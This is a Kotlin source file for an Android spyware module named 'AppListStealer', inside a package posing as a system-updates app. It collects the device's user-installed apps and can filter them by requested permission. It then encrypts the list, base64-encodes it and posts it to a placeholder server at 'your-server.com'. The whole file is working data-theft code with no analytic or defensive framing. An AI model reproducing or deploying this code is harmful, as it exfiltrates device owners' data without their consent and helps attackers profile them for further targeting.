package com.system.updates.modules.data

import android.content.Context
import android.content.pm.PackageManager
import android.util.Base64
import android.util.Log
import com.system.updates.core.CryptoManager
import com.system.updates.core.NetworkUtils
import org.json.JSONArray
import org.json.JSONObject

class AppListStealer(private val context: Context) {
    private val crypto = CryptoManager(context)
    private val networkUtils = NetworkUtils(context)
    private val packageManager = context.packageManager

    fun collectAndSend() {
        val apps = collectInstalledApps()
        if (apps.isNotEmpty()) {
            val json = JSONArray().apply {
                apps.forEach { put(it) }
            }
            val key = crypto.deriveDeviceKey()
            val encrypted = crypto.encryptData(json.toString().toByteArray())
            val b64 = Base64.encodeToString(encrypted, Base64.NO_WRAP)
            networkUtils.httpPost("https://your-server.com/apps", "data=$b64")
        }
    }

    fun collectInstalledApps(): List<Map<String, String>> {
        val apps = mutableListOf<Map<String, String>>()
        try {
            val installed = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
            for (app in installed) {
                if (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM == 0) {
                    val name = app.loadLabel(packageManager).toString()
                    val pkg = app.packageName
                    apps.add(mapOf("name" to name, "package" to pkg))
                }
            }
        } catch (e: Exception) {
            Log.e("AppListStealer", "Error collecting apps", e)
        }
        return apps
    }

    fun filterByPermission(permission: String): List<Map<String, String>> {
        val result = mutableListOf<Map<String, String>>()
        try {
            val installed = packageManager.getInstalledApplications(PackageManager.GET_PERMISSIONS)
            for (app in installed) {
                if (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM == 0) {
                    val perms = packageManager.getPackageInfo(app.packageName, PackageManager.GET_PERMISSIONS)?.requestedPermissions
                    if (perms != null && perms.contains(permission)) {
                        val name = app.loadLabel(packageManager).toString()
                        result.add(mapOf("name" to name, "package" to app.packageName))
                    }
                }
            }
        } catch (e: Exception) {
            Log.e("AppListStealer", "Error filtering apps", e)
        }
        return result
    }
}